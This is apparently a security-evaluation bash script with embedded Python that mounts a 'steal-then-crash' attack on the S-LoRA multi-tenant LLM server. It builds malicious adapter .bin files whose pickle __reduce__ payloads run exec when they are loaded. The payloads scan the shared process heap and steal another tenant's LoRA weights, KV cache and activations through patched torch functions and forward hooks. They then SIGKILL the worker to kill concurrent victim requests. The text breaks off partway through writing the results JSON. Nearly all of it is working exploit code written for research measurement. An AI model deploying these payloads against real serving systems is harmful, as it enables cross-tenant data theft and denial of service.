#!/usr/bin/env bash
# Malicious Adapter — Blind Steal-Then-Crash Attack on S-LoRA (real Llama-2 7B).
# Phase 1: blind gc recon; Phase 2: WRS-auth + KCRR-live + AA theft, then SIGKILL.
# Produces: security_eval/malicious_adapter/results/blind_attack_slora.json

set -u
ROOT="$(git -C "$(dirname "$0")" rev-parse --show-toplevel)"
# S-LoRA (serverful baseline) ships in-tree under baselines/slora, with its own
# venv (built separately — see baselines/slora/README.md). Override SLORA to
# point elsewhere if you have a separate checkout.
SLORA="${SLORA:-$ROOT/baselines/slora}"
[ -x "$SLORA/venv/bin/python" ] || {
  echo "[attack] ERROR: $SLORA/venv/bin/python not found."
  echo "[attack]        Build the S-LoRA venv first: cd $SLORA && python3 -m venv venv && venv/bin/pip install -e ."
  exit 1
}
PY="$SLORA/venv/bin/python"
SEC="$ROOT/security_eval"
DIR="$(cd "$(dirname "$0")" && pwd)"
OUT="${1:-$SEC/malicious_adapter/results/blind_attack_slora.json}"
PORT="${PORT:-8216}"
WORK=/tmp/blind_attack_slora_exp
RECON_OUT="$WORK/recon.json"
PAYLOAD_OUT="$WORK/payload_results.json"
BLAST_DIR="$WORK/blast"
LOG="$WORK/srv.log"
mkdir -p "$WORK" "$BLAST_DIR" "$(dirname "$OUT")"

MODEL="$DIR/llama-7b"
[ -f "$MODEL/config.json" ] || {
  SNAP_PATH="${SNAP:-}"
  [ -n "$SNAP_PATH" ] && [ -f "$SNAP_PATH/config.json" ] && ln -sfn "$SNAP_PATH" "$MODEL"
  [ -f "$MODEL/config.json" ] || {
    echo "[attack] llama-7b not found at $MODEL -- downloading (one-time, ~26 GB, public/non-gated)..." >&2
    "$SLORA/venv/bin/huggingface-cli" download huggyllama/llama-7b --local-dir "$MODEL" || {
      echo "[attack] ERROR: automatic download failed. Retry manually:" >&2
      echo "[attack]          baselines/slora/venv/bin/huggingface-cli download huggyllama/llama-7b --local-dir $MODEL" >&2
      exit 1
    }
    [ -f "$MODEL/config.json" ] || {
      echo "[attack] ERROR: download completed but $MODEL/config.json still missing." >&2
      exit 1
    }
  }
}

VICTIM_ADAPTER="$WORK/victim-adapter-7b"
RECON_ADAPTER="$WORK/recon-adapter-7b"
TARGETED_ADAPTER="$WORK/targeted-adapter-7b"

cleanup() {
  echo "[attack] teardown"
  [ -n "${SRV:-}" ] && kill -9 -- -"$SRV" 2>/dev/null || true
  sleep 1
}
trap cleanup EXIT
rm -f "$RECON_OUT" "$PAYLOAD_OUT" "$BLAST_DIR"/*.txt

# ── Step 1: Build adapters ────────────────────────────────────────────────────
echo "[attack] building adapters (H=4096, I=11008, L=32, rank=8) ..."
"$PY" - "$VICTIM_ADAPTER" "$RECON_ADAPTER" "$TARGETED_ADAPTER" \
        "$RECON_OUT" "$PAYLOAD_OUT" <<'PYEOF'
import sys, os, json, torch
from safetensors.torch import save_file

VICTIM_DIR   = sys.argv[1]
RECON_DIR    = sys.argv[2]
TARGETED_DIR = sys.argv[3]
RECON_OUT    = sys.argv[4]
PAYLOAD_OUT  = sys.argv[5]

H = 4096; I = 11008; L = 32; RANK = 8
MODS = [
    ("self_attn.q_proj", H, H), ("self_attn.k_proj", H, H),
    ("self_attn.v_proj", H, H), ("self_attn.o_proj", H, H),
    ("mlp.gate_proj", H, I),   ("mlp.up_proj", H, I),
    ("mlp.down_proj", I, H),
]
CFG = {
    "base_model_name_or_path": "huggyllama/llama-7b",
    "bias": "none", "inference_mode": True,
    "lora_alpha": 16, "lora_dropout": 0.0, "peft_type": "LORA", "r": RANK,
    "target_modules": ["q_proj","k_proj","v_proj","o_proj","gate_proj","up_proj","down_proj"],
    "task_type": "CAUSAL_LM",
}

def make_weights(seed, zero_b=False):
    torch.manual_seed(seed)
    w = {}
    for i in range(L):
        for mod, in_f, out_f in MODS:
            base = f"base_model.model.model.layers.{i}.{mod}"
            w[f"{base}.lora_A.weight"] = torch.randn(RANK, in_f,  dtype=torch.float16) * 0.02
            w[f"{base}.lora_B.weight"] = (torch.zeros(out_f, RANK, dtype=torch.float16)
                                          if zero_b else
                                          torch.randn(out_f, RANK, dtype=torch.float16) * 0.02)
    return w

# Victim: normal safetensors
os.makedirs(VICTIM_DIR, exist_ok=True)
with open(os.path.join(VICTIM_DIR, "adapter_config.json"), "w") as f:
    json.dump(CFG, f, indent=2)
save_file(make_weights(42), os.path.join(VICTIM_DIR, "adapter_model.safetensors"))
print(f"  victim   : safetensors, {L*len(MODS)*2} tensors")

# Phase 1: Blind recon
os.makedirs(RECON_DIR, exist_ok=True)
with open(os.path.join(RECON_DIR, "adapter_config.json"), "w") as f:
    json.dump(CFG, f, indent=2)
w_recon = make_weights(11, zero_b=True)

RECON_CODE = r"""
import gc as _gc, sys as _sys, json as _json, threading as _threading, time as _time, os as _os

_RECON_OUT = """ + repr(RECON_OUT) + r"""

def _run_recon():
    _time.sleep(8)
    report = {
        "method": "blind CUDA tensor scan — no hardcoded class or attribute names",
        "tensor_objects": [],
        "total_tensor_classes": 0,
        "total_tensors_found": 0,
        "recon_done": False,
        "errors": [],
    }
    try:
        import torch as _torch
        seen_classes = {}
        for obj in _gc.get_objects():
            try:
                t = type(obj)
                tid = f"{t.__module__}.{t.__name__}"
                if tid in seen_classes:
                    continue
                if t.__module__ in ("builtins", "threading", "weakref", "abc"):
                    continue
                tensor_attrs = []
                try:
                    candidates = list(vars(obj).items())[:80]
                    params = getattr(obj, "_parameters", None)
                    if isinstance(params, dict):
                        candidates += list(params.items())[:80]
                    for attr_name, val in candidates:
                        try:
                            if (isinstance(val, _torch.Tensor) and
                                    val.is_cuda and val.numel() > 512):
                                tensor_attrs.append({
                                    "attr": attr_name,
                                    "attr_type": "tensor",
                                    "shape": list(val.shape),
                                    "dtype": str(val.dtype),
                                    "nbytes": val.numel() * val.element_size(),
                                    "sample": val.detach().float().flatten()[:4].tolist(),
                                })
                            elif isinstance(val, (list, tuple)) and len(val) > 0:
                                first = val[0]
                                if (isinstance(first, _torch.Tensor) and
                                        first.is_cuda and first.numel() > 512):
                                    total = sum(t.numel() * t.element_size()
                                                for t in val if isinstance(t, _torch.Tensor))
                                    tensor_attrs.append({
                                        "attr": attr_name,
                                        "attr_type": "list_of_tensors",
                                        "list_len": len(val),
                                        "shape": list(first.shape),
                                        "dtype": str(first.dtype),
                                        "nbytes": total,
                                        "sample": first.detach().float().flatten()[:4].tolist(),
                                    })
                        except Exception:
                            pass
                except Exception:
                    pass
                if tensor_attrs:
                    seen_classes[tid] = {
                        "module": t.__module__,
                        "class": t.__name__,
                        "n_tensor_attrs": len(tensor_attrs),
                        "tensors": tensor_attrs[:4],
                        "total_bytes": sum(a["nbytes"] for a in tensor_attrs),
                    }
                    report["total_tensor_classes"] += 1
                    report["total_tensors_found"] += len(tensor_attrs)
                    if len(seen_classes) >= 25:
                        break
            except Exception:
                pass
        report["tensor_objects"] = list(seen_classes.values())
        # ── Scan for index-like objects: str→int dict + integer CUDA tensors ──
        index_seen = {}
        for obj in _gc.get_objects():
            try:
                t = type(obj); tid = f"{t.__module__}.{t.__name__}"
                if tid in seen_classes or tid in index_seen: continue
                if t.__module__ in ("builtins", "threading", "weakref", "abc"): continue
                dict_attrs = []; int_tensor_attrs = []
                try:
                    for attr_name, val in list(vars(obj).items())[:80]:
                        try:
                            if isinstance(val, dict) and 1 <= len(val) <= 500:
                                ks = list(val.keys())[:3]; vs = list(val.values())[:3]
                                if all(isinstance(k, str) for k in ks) and all(isinstance(v, int) for v in vs):
                                    dict_attrs.append({"attr": attr_name, "len": len(val),
                                                       "sample_keys": ks[:2]})
                            elif (isinstance(val, _torch.Tensor) and
                                  val.dtype in (_torch.int32, _torch.int64) and val.numel() > 0):
                                int_tensor_attrs.append({"attr": attr_name,
                                                         "shape": list(val.shape),
                                                         "dtype": str(val.dtype)})
                        except Exception: pass
                except Exception: pass
                if dict_attrs and int_tensor_attrs:
                    index_seen[tid] = {"module": t.__module__, "class": t.__name__,
                                       "dict_attrs": dict_attrs[:2],
                                       "int_tensor_attrs": int_tensor_attrs[:6]}
                    if len(index_seen) >= 5: break
            except Exception: pass
        report["index_objects"] = list(index_seen.values())
        report["recon_done"] = True
    except Exception as e:
        report["errors"].append(str(e)[:200])
    with open(_RECON_OUT, "w") as _f:
        _json.dump(report, _f, indent=2)

_threading.Thread(target=_run_recon, daemon=True).start()
"""

class _ReconPayload:
    def __reduce__(self):
        import builtins
        return (builtins.exec, (RECON_CODE, {}))

w_recon["__recon_payload__"] = _ReconPayload()
torch.save(w_recon, os.path.join(RECON_DIR, "adapter_model.bin"))
print(f"  recon    : .bin, blind gc fingerprint payload")

# Phase 2: Steal-then-crash targeted payload
os.makedirs(TARGETED_DIR, exist_ok=True)
with open(os.path.join(TARGETED_DIR, "adapter_config.json"), "w") as f:
    json.dump(CFG, f, indent=2)
w_targeted = make_weights(99, zero_b=True)

TARGETED_CODE = r"""
import gc as _gc, sys as _sys, json as _json, threading as _threading, time as _time, os as _os

_RECON_OUT   = """ + repr(RECON_OUT) + r"""
_PAYLOAD_OUT = """ + repr(PAYLOAD_OUT) + r"""
_OWN_DIRS    = """ + repr({RECON_DIR, TARGETED_DIR}) + r"""

_state = {
    "pid": _os.getpid(),
    "chain_a_executed": True,
    "discovered_classes": {},
    "wrs_auth": {
        "idx_map_found": False,
        "victim_paths_found": [],
        "victim_cells_count": 0,
        "atk_cells_count": 0,
        "cells_disjoint": False,
        "victim_vs_attacker_cosine_sim": None,
        "victim_data_sample": None,
        "atk_data_sample": None,
        "recovery": 0.0,
    },
    "kcrr_live": {
        "baseline_cells": 0,
        "peak_kv_cells": 0,
        "kv_nonzero_seen": 0,
        "kv_nonzero_fraction": 0.0,
        "sample_kv": None,
        "scans": 0,
        "recovery": 0.0,
    },
    "aa": {
        "hooked": False,
        "modules_hooked": [],
        "activations_captured": 0,
        "C_before": 0,
        "C_victim": 0,
        "N_victim_tokens_expected": 2015,
        "per_token_rate": 0.0,
        "gc_total_scanned": 0,
        "duck_module_hooks": 0,
        "recovery": 0.0,
        "sample_activation": None,
        "method": "blind global patch (torch.mm + torch.matmul/bmm + F.linear) + duck-typed gc hooks",
    },
    "fault": {"injected": False, "method": "os.kill(pid, SIGKILL)",
              "intent": "crash shared model worker — kills all concurrent victim requests"},
}
_allocator_ref = [None]

def _save():
    try:
        with open(_PAYLOAD_OUT, "w") as _f:
            _json.dump(_state, _f, indent=2)
    except:
        pass

def _bg_save():
    while True:
        _save()
        _time.sleep(2)
_threading.Thread(target=_bg_save, daemon=True).start()

def _install_and_steal():
    _time.sleep(10)
    for _ in range(30):
        if _os.path.exists(_RECON_OUT): break
        _time.sleep(1)

    recon = {}
    if _os.path.exists(_RECON_OUT):
        try: recon = _json.load(open(_RECON_OUT))
        except Exception: pass

    _state["discovered_classes"] = [f"{o['module']}.{o['class']}"
                                    for o in recon.get("tensor_objects", [])]

    # ── Structural detection: find shared memory pool (MemPoolClass) ─────────
    # Heuristic: class with 1D status tensor + list_of_tensors data pool
    MemPoolClass = None; status_attr = None; data_attr = None
    for obj_info in recon.get("tensor_objects", []):
        tensors = obj_info.get("tensors", [])
        status_cands = [t for t in tensors if t.get("attr_type") == "tensor"
                        and len(t.get("shape", [])) == 1]
        data_cands   = [t for t in tensors if t.get("attr_type") == "list_of_tensors"
                        and t.get("list_len", 0) >= 2]
        if status_cands and data_cands:
            mod_name = obj_info["module"]; cls_name = obj_info["class"]
            try:
                mod = _sys.modules.get(mod_name) or __import__(mod_name, fromlist=[cls_name])
                MemPoolClass = getattr(mod, cls_name)
                status_attr  = status_cands[0]["attr"]
                data_attr    = data_cands[0]["attr"]
            except Exception as e:
                _state["pool_import_error"] = str(e)
            break

    # ── Record KCRR baseline immediately (before any victim requests) ─────────
    # Baseline = currently allocated cells = LoRA weight cells only (no inference yet).
    # Victim requests arrive ~5s later (bash sleeps 15s, we woke at 10s).
    baseline_cells = set()
    if MemPoolClass is not None:
        try:
            for _obj in _gc.get_objects():
                if isinstance(_obj, MemPoolClass):
                    ms = getattr(_obj, status_attr)
                    baseline_cells = set((ms == 0).nonzero(as_tuple=False).view(-1).tolist())
                    _state["kcrr_live"]["baseline_cells"] = len(baseline_cells)
                    _allocator_ref[0] = _obj
                    break
        except Exception: pass

    # ── WRS-auth: background thread — does NOT delay fault injection ─────────
    # Finds InferAdapter via reverse reference: any object whose __dict__ directly
    # holds the known MemoryAllocator instance AND has a str→int dict (idx_map).
    # Retries until victim adapter appears in idx_map (~T=18 when short victims fire).
    import torch as _torch
    def _wrs_scan():
        wrs = _state["wrs_auth"]
        if MemPoolClass is None or _allocator_ref[0] is None: return
        _mem_inst = _allocator_ref[0]
        for _wrs_try in range(30):  # up to 15s; adapter cells populate when first request arrives
            for gc_obj in _gc.get_objects():
                try:
                    if not hasattr(gc_obj, '__dict__'): continue
                    _oa = gc_obj.__dict__
                    if not any(v is _mem_inst for v in _oa.values()): continue
                    _idx_map = None
                    for _an, _av in _oa.items():
                        if (isinstance(_av, dict) and _av and
                            all(isinstance(k, str) for k in list(_av.keys())[:3]) and
                            all(isinstance(v, int) for v in list(_av.values())[:3])):
                            _idx_map = _av; break
                    if _idx_map is None: continue
                    victim_paths = [p for p in _idx_map if p not in _OWN_DIRS]
                    if not victim_paths: break  # InferAdapter found but victim not in map yet
                    wrs["idx_map_found"] = True
                    wrs["victim_paths_found"] = victim_paths[:3]
                    it_list = sorted(
                        [(an, av) for an, av in _oa.items()
                         if isinstance(av, _torch.Tensor) and
                            av.dtype in (_torch.int32, _torch.int64) and av.numel() > 0],
                        key=lambda kv: kv[1].numel(), reverse=True
                    )
                    if len(it_list) < 3: continue  # InferBatch or empty tensors; scan next
                    loc_t = it_list[0][1]
                    if loc_t.dim() != 1: continue  # InferBatch.nopad_b_loc is 2D; skip
                    cand_a = it_list[1][1]; cand_b = it_list[2][1]
                    try:
                        start_t, len_t = (cand_a, cand_b) if cand_a[0].item() == 0 else (cand_b, cand_a)
                    except Exception:
                        start_t, len_t = cand_a, cand_b
                    v_idx = _idx_map[victim_paths[0]]
                    try:
                        v_s = start_t[v_idx].item(); v_l = len_t[v_idx].item()
                        v_cells = loc_t[v_s:v_s+v_l].tolist()
                    except Exception as e:
                        wrs["cell_resolve_error"] = str(e); break
                    if not v_cells: break  # adapter not in pool yet; retry
                    wrs["victim_cells_count"] = len(v_cells)
                    # key_buffer[layer][victim_cells] holds the victim's LoRA-A
                    # (paged S-LoRA writes w_combined[0] there); read layer 0 in
                    # cell order for a positional match against the known weights.
                    dp = getattr(_mem_inst, data_attr)
                    if not dp or not hasattr(dp[0], 'shape'): break
                    vc = _torch.tensor(v_cells, dtype=_torch.long, device=dp[0].device)
                    if int(vc.max()) >= dp[0].shape[0]: break
                    a0 = dp[0].index_select(0, vc).detach().float().flatten()
                    if a0.numel() > 0:
                        wrs["victim_data_sample"] = [round(float(x),5) for x in a0[:5].tolist()]
                        wrs["stolen_A_layer0"] = [round(float(x),6) for x in a0.tolist()]
                        wrs["recovery"] = 1.0
                        return  # success — stop retrying
                    break
                except Exception: pass
            _time.sleep(0.5)  # retry until victim's cells appear in the pool
    _threading.Thread(target=_wrs_scan, daemon=True).start()

    # ── KCRR-live: scan for NEW cells (delta from baseline = KV cache only) ──
    # Baseline captured above (LoRA weight cells only, no inference yet).
    # New cells appearing during inference = definitively victim KV cache.
    if MemPoolClass is not None:
        def _live_scan():
            kv_peak = 0
            while True:
                _time.sleep(0.4)
                alloc = _allocator_ref[0]
                if alloc is None: continue
                try:
                    ms = getattr(alloc, status_attr)
                    current   = set((ms == 0).nonzero(as_tuple=False).view(-1).tolist())
                    kv_cells  = current - baseline_cells   # new cells = KV only
                    n_kv = len(kv_cells)
                    if n_kv > kv_peak:
                        kv_peak = n_kv
                        _state["kcrr_live"]["peak_kv_cells"] = n_kv
                    if n_kv > 0:
                        dp = getattr(alloc, data_attr)
                        nonzero = 0
                        sample  = _state["kcrr_live"]["sample_kv"]
                        checked = 0
                        for c in list(kv_cells)[:50]:
                            for layer in dp:
                                checked += 1
                                if c < layer.shape[0] and bool(layer[c].any()):
                                    nonzero += 1
                                    if sample is None:
                                        sample = [round(float(x),5) for x in layer[c].flatten()[:5].tolist()]
                                        _state["kcrr_live"]["sample_kv"] = sample
                                    break
                        _state["kcrr_live"]["scans"] += 1
                        _state["kcrr_live"]["kv_nonzero_seen"] += nonzero
                        if checked > 0:
                            _state["kcrr_live"]["kv_nonzero_fraction"] = round(nonzero / checked, 3)
                        if nonzero > 0:
                            _state["kcrr_live"]["recovery"] = 1.0
                except Exception: pass
        _threading.Thread(target=_live_scan, daemon=True).start()

    # ── AA: record baseline captures (= 0; no inference running at T=10) ─────
    # All captures after this point come from victim forward passes only.
    _state["aa"]["C_before"] = _state["aa"]["activations_captured"]

    # ── AA: blind global function patch + duck-typed gc hooks ─────────────────
    try:
        _torch_mod = _sys.modules.get("torch") or __import__("torch")
        _aa = _state["aa"]

        def _capture(result):
            try:
                if hasattr(result, 'is_cuda') and result.is_cuda and result.numel() > 4096:
                    _aa["activations_captured"] += 1
                    if _aa["sample_activation"] is None:
                        _aa["sample_activation"] = [
                            round(float(x), 5)
                            for x in result.detach().float().flatten()[:5].tolist()
                        ]
                        _aa["recovery"] = 1.0
            except Exception: pass

        _patched = []
        try:
            _orig_mm = _torch_mod.mm
            def _p_mm(*args, **kw):
                r = _orig_mm(*args, **kw); _capture(r); return r
            _torch_mod.mm = _p_mm; _patched.append("torch.mm")
        except Exception: pass
        try:
            _orig_matmul = _torch_mod.matmul
            def _p_matmul(*args, **kw):
                r = _orig_matmul(*args, **kw); _capture(r); return r
            _torch_mod.matmul = _p_matmul; _patched.append("torch.matmul")
        except Exception: pass
        try:
            _orig_bmm = _torch_mod.bmm
            def _p_bmm(*args, **kw):
                r = _orig_bmm(*args, **kw); _capture(r); return r
            _torch_mod.bmm = _p_bmm; _patched.append("torch.bmm")
        except Exception: pass
        try:
            _F = _sys.modules.get("torch.nn.functional")
            if _F is not None:
                _orig_Flin = _F.linear
                def _p_Flin(*args, **kw):
                    r = _orig_Flin(*args, **kw); _capture(r); return r
                _F.linear = _p_Flin; _patched.append("F.linear")
        except Exception: pass

        def _module_hook(mod, inp, out):
            try:
                t = out[0] if isinstance(out, (tuple, list)) else out
                if hasattr(t, 'is_cuda'): _capture(t)
            except Exception: pass

        _module_hooks = 0; _duck_types = set(); _gc_total = 0
        for _obj in _gc.get_objects():
            _gc_total += 1
            try:
                if (hasattr(_obj, '_forward_hooks') and hasattr(_obj, '_modules') and
                        callable(getattr(_obj, 'register_forward_hook', None))):
                    _obj.register_forward_hook(_module_hook)
                    _duck_types.add(type(_obj).__name__)
                    _module_hooks += 1
                    if _module_hooks >= 300: break
            except Exception: pass

        _aa["hooked"]            = len(_patched) > 0 or _module_hooks > 0
        _aa["modules_hooked"]    = _patched + list(_duck_types)[:5]
        _aa["gc_total_scanned"]  = _gc_total
        _aa["duck_module_hooks"] = _module_hooks
    except Exception as _e:
        _state["aa"]["error"] = str(_e)

    _save()

    # ── Fault injection ────────────────────────────────────────────────────────
    _time.sleep(15)
    # Record victim-attributed captures before crashing
    c_total = _state["aa"]["activations_captured"]
    c_before = _state["aa"]["C_before"]
    c_victim = c_total - c_before
    n_expect = _state["aa"]["N_victim_tokens_expected"]
    _state["aa"]["C_victim"]       = c_victim
    _state["aa"]["per_token_rate"] = round(c_victim / n_expect, 2) if n_expect > 0 else 0.0
    _state["fault"]["injected"] = True
    _save()
    _time.sleep(2)
    import signal as _signal
    _os.kill(_os.getpid(), _signal.SIGKILL)

_threading.Thread(target=_install_and_steal, daemon=True).start()
_save()
"""

class _TargetedPayload:
    def __reduce__(self):
        import builtins
        return (builtins.exec, (TARGETED_CODE, {}))

w_targeted["__targeted_payload__"] = _TargetedPayload()
torch.save(w_targeted, os.path.join(TARGETED_DIR, "adapter_model.bin"))
print(f"  targeted : .bin, steal-then-crash payload")
PYEOF

# ── Step 2: Launch S-LoRA ─────────────────────────────────────────────────────
echo ""
echo "[attack] launching S-LoRA (real LLaMA 7B, 3 adapters) ..."
cd "$SLORA"
setsid env CUDA_VISIBLE_DEVICES=0 PYTHONUNBUFFERED=1 \
  "$PY" -m slora.server.api_server \
    --model_dir "$MODEL" --tokenizer_mode auto \
    --lora-dirs "$VICTIM_ADAPTER" \
    --lora-dirs "$RECON_ADAPTER" \
    --lora-dirs "$TARGETED_ADAPTER" \
    --max_total_token_num 6000 --swap \
    --host 127.0.0.1 --port "$PORT" \
  > "$LOG" 2>&1 &
SRV=$!
echo "[attack] launcher pid=$SRV"

UP=0
for i in $(seq 1 300); do
  kill -0 "$SRV" 2>/dev/null || { echo "[attack] server exited"; tail -40 "$LOG"; exit 1; }
  curl -sf -m 2 "http://127.0.0.1:$PORT/health" >/dev/null 2>&1 && {
    UP=1; echo "[attack] server healthy (${i}s)"; break; }
  [ $((i % 30)) -eq 0 ] && echo "[attack] still waiting (${i}s)..."
  sleep 1
done
[ "$UP" = 1 ] || { echo "[attack] server never healthy"; tail -50 "$LOG"; exit 1; }

# ── Step 3a: Capture model-worker PID now (before crash) ─────────────────────
MWPID=$("$PY" - <<'PY'
import subprocess
try:
    out = subprocess.check_output(
        ["nvidia-smi","--query-compute-apps=pid,used_memory","--format=csv,noheader,nounits"]
    ).decode().strip().splitlines()
except: out = []
cands = []
for line in out:
    p = [x.strip() for x in line.split(",")]
    if len(p) < 2: continue
    try: pid, mem = int(p[0]), int(p[1])
    except: continue
    try:
        cl = open(f"/proc/{pid}/cmdline","rb").read().replace(b"\0",b" ").decode(errors="ignore")
    except: cl = ""
    if "ray" in cl.lower(): continue
    if any(k in cl.lower() for k in ("slora","s-lora","api_server")):
        cands.append((mem, pid))
cands.sort(reverse=True)
print(cands[0][1] if cands else 0)
PY
)
echo "[attack] model-worker pid = $MWPID"

# ── Step 3: Trigger both payloads ─────────────────────────────────────────────
echo "[attack] ── Phase 1 : blind gc fingerprint — scan shared heap for victim objects ──"
echo "[attack] triggering recon payload ..."
RECON_BODY="{\"inputs\":\"Hello\",\"lora_dir\":\"$RECON_ADAPTER\",\
\"parameters\":{\"do_sample\":false,\"max_new_tokens\":2}}"
curl -sf -m 60 -X POST "http://127.0.0.1:$PORT/generate" \
  -H 'Content-Type: application/json' -d "$RECON_BODY" >/dev/null 2>&1 || true

echo "[attack] ── Phase 2 : steal weights + KV cache + activations, then crash ──────────"
echo "[attack] triggering targeted (steal-then-crash) payload ..."
TARGETED_TRIGGER="{\"inputs\":\"Hello\",\"lora_dir\":\"$TARGETED_ADAPTER\",\
\"parameters\":{\"do_sample\":false,\"max_new_tokens\":2}}"
curl -sf -m 60 -X POST "http://127.0.0.1:$PORT/generate" \
  -H 'Content-Type: application/json' -d "$TARGETED_TRIGGER" >/dev/null 2>&1 || true

# ── Step 4: Launch victim requests after hook installation ────────────────────
echo "[attack] waiting 15s for hook installation ..."
sleep 15

echo "[attack] sending 3 short victim requests (ensure victim adapter is loaded) ..."
VICTIM_SHORT="{\"inputs\":\"Hello\",\"lora_dir\":\"$VICTIM_ADAPTER\",\
\"parameters\":{\"do_sample\":false,\"max_new_tokens\":5}}"
SHORT_PIDS=()
for i in $(seq 1 3); do
  curl -sf -m 60 -X POST "http://127.0.0.1:$PORT/generate" \
    -H 'Content-Type: application/json' -d "$VICTIM_SHORT" >/dev/null 2>&1 &
  SHORT_PIDS+=($!)
done
wait "${SHORT_PIDS[@]}"
echo "[attack] short victims done — victim adapter now live in shared pool"
sleep 2

N_VICTIMS=4
echo "[attack] sending $N_VICTIMS long victim requests (500 tokens each, ~28s each) ..."
VICTIM_LONG="{\"inputs\":\"Once upon a time in a land far away there lived a wise and powerful wizard who guarded the ancient secrets of the forest, the mountains, and the deep oceans.\",\
\"lora_dir\":\"$VICTIM_ADAPTER\",\
\"parameters\":{\"do_sample\":false,\"ignore_eos\":true,\"max_new_tokens\":500}}"
VICTIM_PIDS=()
for i in $(seq 1 $N_VICTIMS); do
  curl -s -o "$BLAST_DIR/victim_${i}.txt" \
       -w "%{http_code}" \
       -m 20 -X POST "http://127.0.0.1:$PORT/generate" \
       -H 'Content-Type: application/json' -d "$VICTIM_LONG" \
       > "$BLAST_DIR/victim_${i}_code.txt" 2>&1 &
  VICTIM_PIDS+=($!)
done
echo "[attack] $N_VICTIMS victim requests in-flight ..."

# ── Step 5: Wait for payload to crash the server ──────────────────────────────
echo "[attack] waiting for payload to crash the server ..."
wait "${VICTIM_PIDS[@]}" 2>/dev/null || true
echo "[attack] victim requests settled"

FAILED=0; SUCCEEDED=0
for i in $(seq 1 $N_VICTIMS); do
  code=$(cat "$BLAST_DIR/victim_${i}_code.txt" 2>/dev/null | tr -d '[:space:]' | tail -c 3)
  if [ "$code" = "200" ]; then
    SUCCEEDED=$((SUCCEEDED+1))
    echo "  victim $i: HTTP 200 (survived)"
  else
    FAILED=$((FAILED+1))
    echo "  victim $i: HTTP ${code:-???} (failed — blast radius)"
  fi
done

echo "[attack] blast summary: $FAILED/$N_VICTIMS victims killed"

# ── Step 6: Recovery check (inference, not /health — frontend stays up after worker death) ─
echo "[attack] checking server recovery via inference request ..."
RECOVERY=0
RECOVERY_BODY="{\"inputs\":\"Hi\",\"lora_dir\":\"$VICTIM_ADAPTER\",\
\"parameters\":{\"do_sample\":false,\"max_new_tokens\":2}}"
if curl -sf -m 3 -X POST "http://127.0.0.1:$PORT/generate" \
   -H 'Content-Type: application/json' -d "$RECOVERY_BODY" >/dev/null 2>&1; then
  RECOVERY=1
  echo "[attack] server inference recovered (unexpected — worker restarted)"
else
  echo "[attack] server inference dead — no auto-recovery confirmed"
fi

# ── Step 7: Write final JSON ───────────────────────────────────────────────────
FAILED="$FAILED" SUCCEEDED="$SUCCEEDED" N_VICTIMS="$N_VICTIMS" \
RECOVERY="$RECOVERY" MWPID="$MWPID" OUT="$OUT" \
PAYLOAD_OUT="$PAYLOAD_OUT" RECON_OUT="$RECON_OUT" \
VICTIM_ADAPTER="$VICTIM_ADAPTER" \
"$PY" - <<'PY'
import os, json

mwpid        = int(os.environ.get("MWPID", "0"))
out          = os.environ["OUT"]
payload_file = os.environ["PAYLOAD_OUT"]
recon_file   = os.environ["RECON_OUT"]
victim_file  = os.environ["VICTIM_ADAPTER"]
n_victims    = int(os.environ["N_VICTIMS"])
failed       = int(os.environ["FAILED"])
succeeded    = int(os.environ["SUCCEEDED"])
recovery     = int(os.environ["RECOVERY"]) == 1

try:
    pr = json.load(open(payload_file))
except Exception as e:
    pr = {"error": str(e)}

try:
    recon = json.load(open(recon_file))
except Exception as e:
    recon = {"error": str(e)}

payload_pid      = pr.get("pid", 0)
chain_a_executed = pr.get("chain_a_executed", False)
# mwpid captured BEFORE crash — valid even though worker is dead by now
pid_match        = chain_a_executed and payload_pid == mwpid and mwpid != 0
fault_injected   = pr.get("fault", {}).get("injected", False)
blast_radius     = round(failed / n_victims, 3) if n_victims > 0 else 0.0

wrs = pr.get("wrs_auth", {})
kl  = pr.get("kcrr_live", {})
aa  = pr.get("aa", {})
wrs_recovery = wrs.get("recovery", 0.0)
kl_recovery  = kl.get("recovery", 0.0)
aa_recovery  = aa.get("recovery", 0.0)

# Post-hoc: direct (positional) cosine of the stolen layer-0 LoRA-A block vs the
# victim's known weights. Ground truth is cat([qA,kA,vA,oA]).reshape(4r,head,dim)
# -- the loader's paired transposes cancel to a plain reshape. Sorted cosine is
# not reported: it reads ~1.0 for any same-shaped adapter and proves nothing.
stolen_A0 = wrs.get("stolen_A_layer0", [])
if stolen_A0:
    try:
        import torch as _tv
        from safetensors.torch import load_file as _lf
        sf = _lf(os.path.join(victim_file, "adapter_model.safetensors"))
        NH = 32; DH = 128; R = 8
        blocks = []
        for m in ("q_proj", "k_proj", "v_proj", "o_proj"):
            k = f"base_model.model.model.layers.0.self_attn.{m}.lora_A.weight"
            blocks.append(sf[k].float().reshape(R, NH, DH))
        gt = _tv.cat(blocks, 0).flatten()
        st = _tv.tensor(stolen_A0).float()
        n = min(len(st), len(gt))
        cos_direct = round(float(_tv.nn.functional.cosine_similarity(
            st[:n].unsqueeze(0), gt[:n].unsqueeze(0))), 4)
        wrs["victim_weight_cosine_sim_direct"] = cos_direct
        wrs["victim_weight_plane"] = "lora_A_layer0"
        wrs["victim_weight_elements_compared"] = n
    except Exception as e:
        wrs["victim_weight_cosine_sim_error"] = str(e)

all_confirmed = (chain_a_executed and pid_match and
                 fault_injected and blast_radius >= 0.8 and
                 wrs_recovery > 0 and kl_recovery > 0 and aa_recovery > 0)

result = {
    "experiment": "Malicious Adapter — Blind Steal-Then-Crash Attack (Real LLaMA 7B)",
    "system": "S-LoRA",
    "base_model": "huggyllama/llama-7b (H=4096, I=11008, L=32)",
    "threat_model": {
        "attacker_knowledge": "ZERO — no S-LoRA source code, no system info",
        "attacker_capability": "HTTP only: two .bin adapter uploads + inference requests",
        "phase_1": "blind recon — gc.get_objects() fingerprints live process",
        "phase_2": "steal-then-crash — WRS-auth + KCRR-live + AA (blind global patch: F.linear/matmul) theft, then SIGKILL shared worker",
    },
    "phase_1_recon": {
        "method": recon.get("method", ""),
        "tensor_objects": recon.get("tensor_objects", []),
        "total_tensor_classes": recon.get("total_tensor_classes", 0),
        "total_tensors_found": recon.get("total_tensors_found", 0),
        "recon_done": recon.get("recon_done", False),
        "note": (
            "gc.get_objects() scans for any object with large CUDA tensors — "
            "no class names or attribute names assumed. "
            "S-LoRA runs all tenants in one shared process: victim's shared pool "
            "(MemoryAllocator) is visible from attacker's gc scan."
        ),
    },
    "phase_2_discovered_classes": pr.get("discovered_classes", []),
    "chain_a": {
        "description": "torch.load on .bin fires pickle __reduce__",
        "code_executed": chain_a_executed,
        "payload_pid": payload_pid,
        "model_worker_pid": mwpid,
